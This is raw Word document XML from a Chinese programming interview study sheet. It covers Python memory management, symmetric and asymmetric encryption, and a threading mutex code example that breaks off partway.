    <w:p w14:paraId="569E39DA" w14:textId="4CC3EA9F" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目的，在分布式应用中，将并发变为串行，减少数据库压力，提升安全性能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392E0482" w14:textId="50D1160A" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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lastRenderedPageBreak/>
        <w:t>009</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的内存管理机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4454F8" w14:textId="170ECDFF" w:rsidR="00A63022" w:rsidRPr="004300AE" w:rsidRDefault="00A63022" w:rsidP="004300AE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004300AE">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　小整数池 intern机制 引用计数为主，分代回收为辅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317AE463" w14:textId="236A8980" w:rsidR="00A63022" w:rsidRDefault="004300AE" w:rsidP="004300AE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="004300AE">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对称加密和非对称加密是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529883E1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="004300AE" w:rsidRDefault="00A63022" w:rsidP="004300AE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004300AE">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>对称加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DB8982" w14:textId="3B5BFB3C" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5DFE1ACE" wp14:editId="53773B57">
            <wp:extent cx="6057900" cy="10858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057900" cy="1085850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68370ED3" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>非对称性加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2340A340" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>一对公钥和一对私钥</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C385A0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>用户和银行分别有自己的公钥</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EA0784" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>用户使用银行给的公钥对原文进行加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612F3C3A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>银行可以用自己的私钥对密文进行解密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2675C7" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>非对称加密速度很慢。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A814509" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>现实中加密方式的使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4239EA" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>用户使用对称加密，通过秘钥对原文进行加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B4C96F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>将秘钥使用非对称加密方式加密然后传给银行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3D944F" w14:textId="66B3F0D7" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>银行使用秘钥解密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B17112" w14:textId="2C1B2545" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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016</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>线程安全模块时什么，怎么使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E6344E" w14:textId="71B73BBC" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>互斥锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7186C0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014B5B9B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 定义全局变量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4305F358" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> g_num = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56554CFD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 创建全局互斥锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217758EF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> lock = threading.Lock()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9B8630" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 循环一次给全局变量加1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B77D693" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> sum_num1():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6F980B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 上锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7728EB9C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     lock.acquire()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E3A532" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> range(1000000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73457429" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>global</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> g_num</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A86329E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         g_num += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1950BCA1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"sum1:"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, g_num)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49612F2D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 释放锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305B9E27" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     lock.release()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CEF89D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 循环一次给全局变量加1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30246C96" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> sum_num2():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00669043" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 上锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B8FEAD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     lock.acquire()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490F36B9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
